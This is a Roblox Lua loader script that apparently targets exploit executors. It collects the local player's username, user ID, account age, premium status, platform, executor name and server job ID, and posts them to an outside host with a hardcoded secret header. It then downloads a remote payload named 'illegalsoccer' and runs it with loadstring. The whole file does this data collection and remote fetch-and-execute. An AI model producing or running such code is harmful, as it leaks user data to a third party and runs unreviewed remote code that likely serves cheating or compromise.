local http = game:GetService("HttpService")
local players = game:GetService("Players")
local lp = players.LocalPlayer
local char = lp.Character or lp.CharacterAdded:Wait()
local root = char:WaitForChild("HumanoidRootPart")
local hum = char:WaitForChild("Humanoid")

local S = "4da-5AfflU7NCk26W-tFIg=="
local N = "illegalsoccer"
local U = "https://bolt.wisp.uno"

local req = http_request or request or (syn and syn.request) or (http and http.request)
if not req then
    warn("[w] no http transport")
    return
end

local function try(f, fb)
    local ok, v = pcall(f)
    if ok and v ~= nil then
        return v
    end
    return fb
end

local function exec_id()
    local f = identifyexecutor or getexecutorname
    if not f then
        return "Unknown"
    end
    local ok, n, v = pcall(f)
    if not ok or not n or n == "" then
        return "Unknown"
    end
    n = tostring(n)
    if v and tostring(v) ~= "" then
        return n .. " " .. tostring(v)
    end
    return n
end

local function post(e, d, h)
    local hdrs = h or {}
    hdrs["Content-Type"] = "application/json"
    local ok, r = pcall(req, {
        Url = U..e,
        Method = "POST",
        Headers = hdrs,
        Body = http:JSONEncode(d)
    })
    if not ok or not r or r.StatusCode ~= 200 then
        return nil
    end
    local ok2, j = pcall(http.JSONDecode, http, r.Body)
    return ok2 and j or nil
end

local function get(e, h)
    local ok, r = pcall(req, {
        Url = U..e,
        Method = "GET",
        Headers = h or {}
    })
    if not ok or not r or r.StatusCode ~= 200 then
        return nil
    end
    return r.Body
end

local function collect()
    local cam = workspace.CurrentCamera
    local vp = cam and cam.ViewportSize or Vector2.zero
    local pos = root and root.Position or nil

    return {
        script = {
            name = N,
            executed_at = os.date("%Y-%m-%d %H:%M:%S"),
            join = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", '" .. game.JobId .. "', game:GetService('Players').LocalPlayer)"
        },
        player = {
            name = lp.Name,
            display = lp.DisplayName,
            userid = lp.UserId,
            health = hum.Health,
            max_health = hum.MaxHealth
        },
        account = {
            age = try(function() return lp:GetAccountAge() end, 0),
            premium = try(function() return lp.MembershipType ~= Enum.MembershipType.None end, false),
            created = try(function() return lp.AccountAge end, 0)
        },
        game = {
            name = try(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end, "?"),
            placeid = game.PlaceId,
            version = try(function() return game:GetService("GameSettings").PlaceVersion end, 0)
        },
        server = {
            players = #players:GetPlayers(),
            max_players = players.MaxPlayers,
            time = os.time(),
            jobid = game.JobId
        },
        network = {
            ping = try(function() return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() end, 0)
        },
        system = {
            platform = try(function()
                local p = game:GetService("UserInputService"):GetPlatform()
                return (p == Enum.Platform.Windows or p == Enum.Platform.OSX) and "PC" or "Mobile"
            end, "?"),
            resolution = string.format("%dx%d", vp.X, vp.Y),
            memory = math.floor(collectgarbage("count") / 1024),
            executor = exec_id()
        },
        character = {
            position = pos and string.format("%.1f, %.1f, %.1f", pos.X, pos.Y, pos.Z) or "?"
        }
    }
end

local t = collect()
local r = post("/log", t, {["X-Proxy-Secret"] = S})

if not r or not r.key then
    warn("[w] log fail")
    return
end

local code = get("/payload/"..N, {["X-DL-Key"] = r.key})
if not code then
    warn("[w] payload fail")
    return
end

getgenv()._nk = r.nk
getgenv()._pu = U

local f, e = loadstring(code)
if not f then
    warn("[w] compile: "..tostring(e))
    return
end

pcall(f)